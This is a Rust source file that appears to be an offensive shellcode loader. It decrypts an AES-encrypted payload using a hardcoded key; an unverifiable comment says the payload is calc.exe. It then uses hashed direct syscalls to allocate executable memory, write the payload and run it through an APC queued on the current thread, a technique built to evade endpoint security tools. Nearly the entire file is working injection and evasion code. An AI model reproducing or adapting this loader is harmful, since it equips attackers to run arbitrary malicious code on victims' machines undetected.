use libaes::Cipher;
use winapi::shared::basetsd::{PSIZE_T, SIZE_T, ULONG_PTR};
use winapi::shared::ntdef::{HANDLE, NTSTATUS, PVOID, ULONG};
use ntapi::winapi::ctypes::c_void;
use ntapi::ntpsapi::{NtCurrentProcess, NtCurrentThread, PPS_APC_ROUTINE};
use std::mem::transmute;
use std::ptr::null_mut;

use syscall::{MyMakeSyscall, get_ssn, get_syscall_list};

mod syscall;

fn main() {
    //let argv: Vec<String> = std::env::args().collect();

    //if argv.iter().filter(|s| s.as_str() == "run").count() < 1 {
    //    println!("Usage: ./project.exe run");
    //    return;
    //}

    // calc.exe.. if you trust me :)
    let shellcode = b"\x14\xef\xb2\xba\x46\x35\x5a\x7b\xa1\xc5\x6a\x85\xbd\xc4\x04\x99\xc9\xb0\x07\xdb\x7b\x19\xf8\x1d\xaf\xc7\x9e\x3a\xff\x45\x31\xb0\xda\x8d\x93\x68\xa7\xcd\x79\x65\xd5\xb7\xc0\x35\x92\xaa\x6c\x20\xa9\x8c\x8f\xf9\x61\xa4\x79\xf5\xce\xff\xcd\x3b\xc5\x50\xbb\x38\xc3\x8c\xfe\x37\x20\x94\x32\x1d\x7c\x6d\x34\x95\x54\xb8\x94\x2d\x1f\x8b\xd7\x3f\x9c\xe9\xac\x11\x4e\x5b\xe7\xeb\xba\x0a\xd9\x8c\x75\x25\xc4\x62\x26\x56\x29\x5a\xd8\x63\xbc\x6b\x11\x37\xfa\xdc\xa6\x67\x81\xa9\x67\xf5\xeb\xa7\x4c\x88\x64\xc2\x92\x2e\xdc\x2f";
    let key = b"MySecuredKey123+";
    let iv = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F";
    let cipher = Cipher::new_128(&key);
    let decrypted = cipher.cbc_decrypt(iv, &shellcode[..]);


    unsafe {
        let syscall_list = get_syscall_list().expect("Dll not found in memory");
        let mut allocstart: *mut c_void = null_mut();
        let mut seize: usize = decrypted.len();
        println!("Going for the syscall...");

        let my_nt_allocate_virtual_memory = transmute::<*const (), fn (HANDLE, *mut PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG) -> NTSTATUS>(MyMakeSyscall as *const ());
        let my_nt_write_virtual_memory = transmute::<*const (), fn (HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T) -> NTSTATUS>(MyMakeSyscall as *const ());
        let my_nt_queue_apc_thread = transmute::<*const (), fn (HANDLE, PPS_APC_ROUTINE, PVOID, PVOID, PVOID) -> NTSTATUS>(MyMakeSyscall as *const());
        let my_nt_test_alert = MyMakeSyscall;

        get_ssn(&syscall_list, 572265531);
        my_nt_allocate_virtual_memory(
                NtCurrentProcess,
                &mut allocstart,
                0,
                &mut seize,
                0x00003000,
                0x40,
        );

        get_ssn(&syscall_list, 978912993);
        my_nt_write_virtual_memory(
                NtCurrentProcess,
                allocstart,
                decrypted.as_ptr() as _,
                decrypted.len() as usize,
                null_mut(),
        );

        get_ssn(&syscall_list, 1354052103);
        my_nt_queue_apc_thread(
            NtCurrentThread,
            Some(std::mem::transmute(allocstart)) as PPS_APC_ROUTINE,
            allocstart,
            null_mut(),
            null_mut(),
        );

        get_ssn(&syscall_list, 3314412110);
        my_nt_test_alert();
    }
}
